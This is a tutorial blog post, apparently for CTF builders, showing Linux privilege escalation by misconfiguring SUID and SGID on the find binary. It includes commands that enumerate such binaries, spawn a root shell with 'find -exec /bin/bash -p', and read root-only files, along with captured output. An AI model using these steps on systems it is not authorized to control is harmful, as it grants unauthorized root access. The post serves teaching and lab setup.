---
title: Linux Privilege Escalation - SUID/SGID for CTF Creators
draft: false
author: "pwnlog"
authorLink: ""
description: ""
license: ""
images: []
date: 2021-12-28 11:33:00 +0800
categories: [Linux Privilege Escalation]
tags: [privilege escalation, shared object injection, suid, sgid, gtfobins, defend]

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: false
rssFullText: false

code:
  copy: true
  maxShownLines: -1
  # ...
math:
  enable: true
  # ...
mapbox:
  accessToken: ""
  # ...
share:
  enable: true
  # ...
comment:
  enable: true
  # ...
library:
  css:
    # someCSS = "some.css"
    # located in "assets/"
    # Or
    # someCSS = "https://cdn.example.com/some.css"
  js:
    # someJS = "some.js"
    # located in "assets/"
    # Or
    # someJS = "https://cdn.example.com/some.js"
seo:
  images: []
  # ...

summary: "ID or GID as 0? (<_<)"
---

# SUID/SGID

A Set User ID (SUID) can be misconfigured to elevate privileges. Similarly, a Set Group ID (SGID) could have incorrect permissions in place.

### Set UID (SUID)
A file with the SUID bit set will always execute with the privileges of the file's owner, regardless of the user executing the command. This means that if a file owned by the root user has the SUID bit set, it will execute with root privileges, potentially leading to privilege escalation if misconfigured.

### Set GID (SGID)
- **On a File**: If the SGID bit is set on a file, it allows the file to be executed with the privileges of the group that owns the file.
- **On a Directory**: If the SGID bit is set on a directory, any files created within that directory will inherit the group ownership of the directory, rather than the primary group of the user who created the file.

# Privilege Escalation via SUID

Let's set a SUID bit to the `find` command, to do that we need to locate the `find` binary:

```shell
which find
```

Once we found the absolute path of the `find` binary, add a SUID bit to it:

```shell
sudo chmod u+s /usr/bin/find
```

Then by using the following command, we can enumerate all the binaries and scripts that have the SUID permission set, this is known as the **Symbolic Method** because it uses symbols.

```shell
find / -perm -u=s 2>/dev/null
find / -perm -u=s 2>/dev/null | grep find | xargs ls -l
```

Alternatively, we could use the **Octal/Numeric Method**, which uses octal values:

```shell
find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null | grep find | xargs ls -l
```

Now we know that the SUID bit is enabled for the `find` command which means that we can execute any command as the root user using the `find` command since the Super User ID (SUID) is 0 (root). Try the following command, which tries to find anything in the current working directory with the command (`find .`) then it uses the `-exec` parameter which handles the `id` command, then we have a `\` to escape the semicolon character (`;`) because the shell will interpret the semicolon character if it's not escaped:

```shell
find . -exec "id" \;
```

This means that we can execute any command as root, so we could, for example, spawn a bash shell as root:

```shell
user@pwn:~$ /usr/bin/find . -exec /bin/bash -p \; -quit
bash-5.0# id
uid=1000 (user) gid=1000 (user) euid=0(root) groups=1000 (user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare)
bash-5.0# whoami
root
bash-5.0# 
```

For more SUID binary shell escapes we can search on [GTFOBins](https://gtfobins.github.io/#+suid) with the SUID tag, as we can see, `GTFOBins` has a lot of SUID binary commands that we can use to escalate privileges. This repository is a cheat sheet of binaries. On this site, we can find ways to escalate privileges using SUID bit sets and more.

# Privilege Escalation via SGID

Let's add an `SGID` bit to the `/usr/bin/find` binary:

```shell
sudo chmod u-s /usr/bin/find && sudo chmod g+s /usr/bin/find
```

Then by using the following command, we can enumerate all the binaries and scripts having `SGID` permission. We can find `SGID` binaries using the Symbolic method:

```shell
find / -perm -g=s 2>/dev/null
find / -perm -g=s 2>/dev/null | grep find | xargs ls -l
```

Alternatively, we can use the Octal/Numeric method, which uses octal values:

```shell
find / -perm -2000 2>/dev/null
find / -perm -2000 2>/dev/null | grep find | xargs ls -l
```

Now we know that the `SGID` bit is enabled by using the `find` command which means that we can execute any command as the root user using the `find` command since the Super Group ID (SGID) is 0 (root). Try the following command, which tries to find anything in the current working directory with the command (`find .`) then it uses the `-exec` parameter which handles the `id` command, then we have a `\` to escape the semicolon character (`;`) because the shell will interpret the semicolon character if it's not escaped, lastly we pipe this output and filter the `gid` string or text with the `grep` command:

```shell
user@pwn:~$  find . -exec "id" \; | grep egid
uid=1000 (user) gid=1000 (user) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare),1000 (user)
```

This allows us to read files that are readable by the root group, we can test this by creating a file as root:

```shell
sudo vim test
```

Write any message that we want:

```txt
This was created by root and only root can read it.
```

Change the permissions for other users and groups:

```shell
sudo chmod o-r test
```

Now try to read the file as `others`:

```shell
cat test
```

Since the `find` binary has an SGID bit set we can try to read some files on the system that belong to the root group.

```shell
user@pwn:~$ /usr/bin/find . -exec cat test \; -quit
This was created by root and only root can read it.
```